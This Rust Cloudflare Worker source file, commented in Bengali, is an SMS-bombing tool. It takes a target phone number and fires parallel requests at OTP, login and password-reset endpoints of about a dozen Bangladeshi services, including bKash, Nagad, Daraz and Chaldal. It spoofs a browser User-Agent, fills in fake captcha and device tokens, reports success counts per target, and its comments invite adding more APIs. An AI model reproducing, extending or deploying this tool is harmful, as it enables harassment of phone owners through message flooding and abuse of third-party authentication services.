use worker::*;
use serde_json::{json, Value};
use wasm_bindgen_futures::JsFuture;
use wasm_bindgen::JsValue;

// ═══════════════════════════════════════════════════
//  CORS — wildcard, সব origin allow
// ═══════════════════════════════════════════════════
pub fn cors_headers() -> Headers {
    let mut h = Headers::new();
    h.set("Access-Control-Allow-Origin", "*").unwrap();
    h.set("Access-Control-Allow-Methods", "GET, POST, OPTIONS").unwrap();
    h.set("Access-Control-Allow-Headers", "Content-Type").unwrap();
    h.set("Content-Type", "application/json").unwrap();
    h
}

// ═══════════════════════════════════════════════════
//  SINGLE API CALL — ultra fast, no blocking
// ═══════════════════════════════════════════════════
async fn fire(
    name:    &'static str,  // API নাম
    url:     &'static str,  // API URL
    payload: Value,         // JSON body
) -> Value {
    let mut init = RequestInit::new();
    init.with_method(Method::Post);

    let mut h = Headers::new();
    h.set("Content-Type",  "application/json").unwrap();
    h.set("User-Agent",    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36").unwrap();
    h.set("Accept",        "application/json, */*").unwrap();
    h.set("Accept-Language", "en-US,en;q=0.9").unwrap();
    init.with_headers(h);
    init.with_body(Some(payload.to_string().into()));

    match Request::new_with_init(url, &init) {
        Ok(req) => match Fetch::Request(req).send().await {
            Ok(mut r) => {
                let s = r.status_code();
                json!({"api": name, "status": s, "ok": s==200||s==201||s==202})
            }
            Err(_) => json!({"api": name, "status": 0, "ok": false})
        },
        Err(_) => json!({"api": name, "status": 0, "ok": false})
    }
}

// ═══════════════════════════════════════════════════
//  PARALLEL RUNNER — সব API একসাথে fire করে
//  Cloudflare Workers WASM এ সবচেয়ে fast পদ্ধতি
// ═══════════════════════════════════════════════════
macro_rules! parallel {
    ($($f:expr),+ $(,)?) => {{
        let js_promises = js_sys::Array::new();
        $(
            js_promises.push(
                &wasm_bindgen_futures::future_to_promise(async move {
                    let v = $f.await;
                    Ok(JsValue::from_str(&v.to_string()))
                })
            );
        )+
        let all = js_sys::Promise::all(&js_promises);
        let results_js = JsFuture::from(all).await.unwrap_or(JsValue::NULL);
        let arr = js_sys::Array::from(&results_js);
        let mut out: Vec<Value> = Vec::new();
        for i in 0..arr.length() {
            let s = arr.get(i).as_string().unwrap_or_default();
            out.push(serde_json::from_str(&s).unwrap_or(json!({"ok":false})));
        }
        out
    }};
}

// ═══════════════════════════════════════════════════
//  MAIN HANDLER
// ═══════════════════════════════════════════════════
pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
    let headers = cors_headers();

    if req.method() == Method::Options {
        return Ok(Response::empty()?.with_headers(headers));
    }
    if req.method() != Method::Post {
        return Ok(Response::error("POST Only", 405)?.with_headers(headers));
    }

    let body: Value = req.json().await.unwrap_or_default();
    let number = body.get("number")
        .and_then(|v| v.as_str())
        .unwrap_or("").trim().to_string();

    if number.is_empty() {
        return Ok(Response::ok(
            json!({"status":"error","message":"Number missing"}).to_string()
        )?.with_headers(headers));
    }

    // ── Phone number formats ──
    let bd_no   = number.trim_start_matches('0').to_string(); // 1XXXXXXXXX
    let bd_full = format!("880{}", bd_no);                    // 8801XXXXXXXXX
    let plus_bd = format!("+88{}", number);                   // +8801XXXXXXXXX

    // ═══════════════════════════════════════════════
    //  API LIST — সব একসাথে parallel fire হবে
    //
    //  নতুন API যোগ করতে:
    //  fire(
    //      "API নাম",           ← name
    //      "https://api.url",   ← url
    //      json!({              ← body/data
    //          "key": &number,
    //      })
    //  ),
    // ═══════════════════════════════════════════════
    let api_results = parallel![
        // ── BD SMS APIs ──
        fire("Shadhin Music",
            "https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq",
            json!({"msisdn": &bd_full, "shortcode": 16235, "servicename": "Shadhin Music"})
        ),
        fire("Khaodao",
            "https://api.eat-z.com/auth/customer/app-connect",
            json!({"username": &plus_bd})
        ),
        fire("Walton Plaza",
            "https://waltonplaza.com.bd/api/auth/otp/create",
            json!({"auth": {"countryCode": "880", "phone": &bd_no}, "captchaToken": "recapcha"})
        ),
        fire("Easy.com.bd",
            "https://core.easy.com.bd/api/v1/forgot-password-otp",
            json!({"device_key": "2ea97d276a980993308116baa292cec9", "mobile": &number})
        ),
        fire("Chaldal",
            "https://chaldal.com/api/OTP/GenerateOTP",
            json!({"phoneNumber": &plus_bd})
        ),
        fire("Shajgoj",
            "https://shajgoj.com/wp-json/cocart/v1/customer/otp",
            json!({"phone": &number, "type": "login"})
        ),
        fire("Bkash",
            "https://www.bkash.com/api/get-otp",
            json!({"mobile": &number})
        ),
        fire("Nagad",
            "https://api.mynagad.com/api/dfs/check-account",
            json!({"accountNumber": &bd_full})
        ),
        fire("Pathao Food",
            "https://pathao.com/api/v1/auth/otp",
            json!({"phone": &number, "country_code": "+880"})
        ),
        fire("Shohoz",
            "https://shohoz.com/api/v4.0/user/sendOTP",
            json!({"mobile_no": &number})
        ),
        fire("Daraz",
            "https://member.daraz.com.bd/user/api/v1/otp/sendOtp",
            json!({"mobile": &bd_full, "countryCode": "880", "action": "REGISTER"})
        ),
        fire("Sheba.xyz",
            "https://sheba.xyz/api/v2/auth/otp",
            json!({"mobile": &number})
        ),
        // ── এখানে নতুন API যোগ করো ──
        // fire("API নাম", "https://api.url", json!({"phone": &number})),
        // fire("API নাম", "https://api.url", json!({"mobile": &bd_full})),
    ];

    let success = api_results.iter()
        .filter(|r| r["ok"].as_bool().unwrap_or(false))
        .count() as u32;
    let failed = api_results.len() as u32 - success;

    Ok(Response::ok(json!({
        "status":  "executed",
        "target":  number,
        "success": success,
        "failed":  failed,
        "total":   success + failed,
        "results": api_results
    }).to_string())?.with_headers(headers))
}
